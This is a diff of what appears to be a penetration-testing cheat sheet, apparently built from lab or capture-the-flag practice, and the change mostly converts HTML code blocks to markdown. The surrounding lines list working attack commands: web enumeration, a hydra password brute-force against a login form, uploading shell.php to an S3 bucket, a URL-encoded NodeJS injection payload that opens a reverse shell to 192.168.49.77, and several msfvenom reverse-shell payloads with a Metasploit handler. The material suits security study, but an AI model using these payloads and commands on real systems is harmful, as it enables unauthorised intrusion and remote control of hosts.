@@ -78,22 +78,21 @@ nslookup [IP_ADDR]
 
 #### HTTP (80) / HTTPS (443)
 
-<pre class="language-shell"><code class="lang-shell">gobuster dir -u [URL] -w [WORDLIST] -b "400,404"    # web enumeration, note: windows web server are case insensitive
+```shell
+gobuster dir -u [URL] -w [WORDLIST] -b "400,404"    # web enumeration, note: windows web server are case insensitive
 ffuf -u http://[IP_ADDR]/ -H "Host: FUZZ.[DOMAIN]" -w /seclists/Discovery/DNS/shubs-subdomains.txt -t 100 -fl 10
-<strong>curl -i -X POST -H 'Content-Length: 0' http://example.com
-</strong><strong>curl -i -X POST -H 'Content-type: application/json' -d '{"name":"test"}' http://example.com
-</strong><strong>nikto -h [URL]
-</strong>davtest -url [URL]    # PUT method test
+nikto -h [URL]
+davtest -url [URL]    # PUT method test
 cadaver [IP_ADDR]    # for authenticated webdav with credentials
 cewl [URL]    # get possible password from site
 wpscan --url    # or manually browse to /wp-content/plugins/ if no plugins found
 aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb   # aws s3 bucket list
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb   # upload file
-hydra [IP_ADDR] http-form-post "/form/frontpage.php:user=admin&#x26;pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+hydra [IP_ADDR] http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
 
 ----NodeJS function injection----
 (function(){var+net+%3d+require("net"),cp%3drequire("child_process"),sh%3dcp.spawn("/bin/sh",+[])%3bvar+client+%3d+new+net.Socket()%3b+client.connect(21,+"192.168.49.77",+function(){client.pipe(sh.stdin)%3bsh.stdout.pipe(client)%3bsh.stderr.pipe(client)%3b})%3breturn+/a/%3b})()%3b
-</code></pre>
+```
 
 #### Kerberos (88)
 
@@ -301,8 +300,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[MY_IP_ADDR] LPORT=4444 -f [as
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.134 LPORT=4242 -f elf > reverse.elf
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.74 LPORT=21 -f msi> evil.msi
 msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.119.219 lport=8888 -f exe -a x64 > vuln64.exe
-# no need exploit/multi/handler v
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.131 LPORT=21 -f msi > priv.msi
+
 ----------------------------------
 msfconsole:
 use exploit/multi/handler
@@ -383,4 +381,4 @@ chisel.exe server -p 8080 --socks5
 
 :white\_check\_mark: port scan\
 :white\_check\_mark: password reuse\
-:white\_check\_mark: check version for vulnerabilities and exploit\\
+:white\_check\_mark: check version for vulnerabilities and exploit\
